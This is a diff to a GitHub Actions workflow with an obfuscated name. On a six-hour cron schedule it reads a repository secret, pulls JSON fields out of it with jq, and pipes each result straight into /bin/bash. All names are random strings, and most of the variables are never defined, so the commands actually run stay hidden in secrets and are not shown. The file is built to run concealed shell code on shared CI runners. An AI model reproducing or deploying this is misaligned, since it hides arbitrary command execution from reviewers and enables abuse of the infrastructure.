@@ -3,22 +3,35 @@ name: kutibuxue
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 0/6 * * *'
+    - cron: '48 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: kutibuxue
         env:
-          g3421: ${{ secrets.g3421 }}
+          ypazp38: ${{ secrets.ypazp38 }}
         run: |
-          echo $g3421 | jq -r .h35 | /bin/bash
-          echo $vdz88913 | jq -r .s92 | /bin/bash
-          echo $wmb80 | jq -r .sko12887 | /bin/bash
-          echo $ysq661 | jq -r .xyq5 | /bin/bash
-          echo $fw725 | jq -r .xeju03802 | /bin/bash
-          echo $qszos2751 | jq -r .twjg33 | /bin/bash
-          echo $w3 | jq -r .fh63141 | /bin/bash
-          echo $zvfff95860 | jq -r .upf4431 | /bin/bash
+          echo $ypazp38 | jq -r .d70 | /bin/bash
+          echo $feh031 | jq -r .rqt346 | /bin/bash
+          echo $tlwf5666 | jq -r .wzsll21099 | /bin/bash
+          echo $baq0 | jq -r .taef839 | /bin/bash
+          echo $ux6 | jq -r .pdcgw48 | /bin/bash
+          echo $rtols222 | jq -r .ymz8654 | /bin/bash
+          echo $p289 | jq -r .ff552 | /bin/bash
+          echo $a9094 | jq -r .buo70 | /bin/bash
+          echo $db58 | jq -r .fftn8 | /bin/bash
+          echo $igub02 | jq -r .l0 | /bin/bash
+          echo $x9516 | jq -r .ywftq065 | /bin/bash
+          echo $ga04 | jq -r .j189 | /bin/bash
+          echo $ciblw81590 | jq -r .rwrm364 | /bin/bash
+          echo $hvm45 | jq -r .m0 | /bin/bash
+          echo $zuylw6 | jq -r .tmfp036 | /bin/bash
+          echo $rs1 | jq -r .tjqbj3 | /bin/bash
+          echo $ywx848 | jq -r .el46 | /bin/bash
+          echo $r365 | jq -r .w61 | /bin/bash
+          echo $wnxc1 | jq -r .mx788 | /bin/bash
 
